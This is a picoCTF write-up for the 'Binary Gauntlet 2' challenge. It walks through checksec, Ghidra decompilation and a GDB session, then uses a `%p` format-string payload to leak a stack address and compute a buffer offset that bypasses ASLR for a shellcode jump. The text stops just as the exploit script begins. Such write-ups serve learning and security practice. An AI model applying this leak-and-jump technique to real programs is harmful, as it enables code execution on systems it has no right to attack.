# Binary Gauntlet 2
Category: Binary Exploitation, 50 points
## Description
> How does ASLR affect your exploit?
A binary file was attached.
## Solution
This is the follow-up for [Binary Gauntlet 1](Binary_Gauntlet_1.md).
Let's run `checksec` on the file:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/Binary_Gauntlet_2]
└─$ checksec --file=gauntlet
[*] '/media/sf_CTFs/pico/Binary_Gauntlet_2/gauntlet'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
We can see that there are virtually no protections for this program. The description says that they've enabled ASLR though, which means that some addresses should get randomized.
Using Ghidra, we can check the decompiled output of the program:
```c
undefined8 main(void)
{
  char local_78 [104];
  char *local_10;
  local_10 = (char *)malloc(1000);
  fgets(local_10,1000,stdin);
  local_10[999] = '\0';
  printf(local_10);
  fflush(stdout);
  fgets(local_10,1000,stdin);
  local_10[999] = '\0';
  strcpy(local_78,local_10);
  return 0;
}
```
The local buffer address leak from the previous challenge is gone. If we're able to find it using another method, we'll be able to replicate our exploit from the previous challenge by copying some shellcode to the local buffer and jumping to it. To leak the buffer address, we'll use a vulnerability which has existed since the first challenge but wasn't needed until now: A format string vulnerability. 
A format string vulnerability is when the program allows the user to control the first parameter to `printf`. This means that the user can provide format string specifiers such as `%x`, `%s` or `%p` and leak data from the stack. We'll want to use this vulnerability to leak the address of the local buffer, so that we can jump to it and execute our shellcode from it. 
Let's run the program in the debugger and check the address of the local buffer. But first, we'll check the disassembly and see where the buffer starts:
```assembly
   0x0000000000400701 :   mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400705 :   add    rax,0x3e7
   0x000000000040070b :   mov    BYTE PTR [rax],0x0
   0x000000000040070e :   mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000400712 :   lea    rax,[rbp-0x70]
   0x0000000000400716 :   mov    rsi,rdx
   0x0000000000400719 :   mov    rdi,rax
   0x000000000040071c :   call   0x400550 
```
The destination for the `strcpy` (as reflected in `rdi`) is `rbp-0x70`, so that's where the local buffer starts. Now, to the debugger. We set a breakpoint at `main`, step a few instructions ahead to that the stack frame is set up and check what's the address of our local buffer:
```
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000000000400687  →   push rbp
$rbx   : 0x0
$rcx   : 0x00007ffff7fb1718  →  0x00007ffff7fb3b00  →  0x0000000000000000
$rdx   : 0x00007fffffffe968  →  0x00007fffffffec09  →  "LANG=en_IL"
$rsp   : 0x00007fffffffe7e0  →  0x00007fffffffe958  →  0x00007fffffffebda  →  "/media/sf_CTFs/pico/Binary_Gauntlet_2/gauntlet"
$rbp   : 0x00007fffffffe860  →  0x0000000000400730  →   push r15
$rsi   : 0x00007fffffffe958  →  0x00007fffffffebda  →  "/media/sf_CTFs/pico/Binary_Gauntlet_2/gauntlet"
$rdi   : 0x3e8
$rip   : 0x000000000040069b  →   call 0x400580 
$r8    : 0x0
$r9    : 0x00007ffff7fe2180  →   push rbp
$r10   : 0x0
$r11   : 0x0
$r12   : 0x00000000004005a0  →   xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero CARRY parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe7e0│+0x0000: 0x00007fffffffe958  →  0x00007fffffffebda  →  "/media/sf_CTFs/pico/Binary_Gauntlet_2/gauntlet"                                                                                     ← $rsp
0x00007fffffffe7e8│+0x0008: 0x0000000100000000
0x00007fffffffe7f0│+0x0010: 0x0000000000000000
0x00007fffffffe7f8│+0x0018: 0x0000000000000000
0x00007fffffffe800│+0x0020: 0x0000000000000000
0x00007fffffffe808│+0x0028: 0x0000000000000000
0x00007fffffffe810│+0x0030: 0x0000000000f0b5ff
0x00007fffffffe818│+0x0038: 0x00000000000000c2
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40068f          mov    DWORD PTR [rbp-0x74], edi
     0x400692         mov    QWORD PTR [rbp-0x80], rsi
     0x400696         mov    edi, 0x3e8
 →   0x40069b         call   0x400580 
   ↳    0x400580    jmp    QWORD PTR [rip+0x200aaa]        # 0x601030 
        0x400586    push   0x3
        0x40058b   jmp    0x400540
        0x400590    jmp    QWORD PTR [rip+0x200aa2]        # 0x601038 
        0x400596    push   0x4
        0x40059b   jmp    0x400540
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
malloc@plt (
   $rdi = 0x00000000000003e8,
   $rsi = 0x00007fffffffe958 → 0x00007fffffffebda → "/media/sf_CTFs/pico/Binary_Gauntlet_2/gauntlet",
   $rdx = 0x00007fffffffe968 → 0x00007fffffffec09 → "LANG=en_IL"
)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "gauntlet", stopped 0x40069b in main (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40069b → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef>  p/x $rbp-0x70
$1 = 0x7fffffffe7f0
```
The address is `0x7fffffffe7f0`. Now, we can allow the program to continue, and when it requests us to enter a string via `fgets`, we'll enter `%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.` to inspect the contents of the stack:
```
gef>  c
Continuing.
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
0x602691.(nil).0x6026c1.0x6022a0.0x7ffff7fb1be0.0x7fffffffe958.0x100000000.(nil).(nil).(nil).(nil).0xf0b5ff.0xc2.0x1.0x40077d.(nil).
```
Looking at the values leaked back to us, we see that the sixth value is relatively near to the local buffer's address: `0x7fffffffe958`. We can calculate the difference between both values: 
```python
>>> hex(0x7fffffffe958 - 0x7fffffffe7f0)
'0x168'
```
So what this means is that if we leak the sixth value from the stack using the format string vulnerability and subtract `0x168`, we should get the runtime address of our buffer. This techniques bypasses any ASLR protection since we're using a leaked runtime address to perform the calculation. 
Here's a script to automate the exploit:
```python
# First, generate a pwntools template using the following command:
#  pwn template --host mercury.picoctf.net --port 65046 ./gauntlet
#===========================================================
#                    EXPLOIT GOES HERE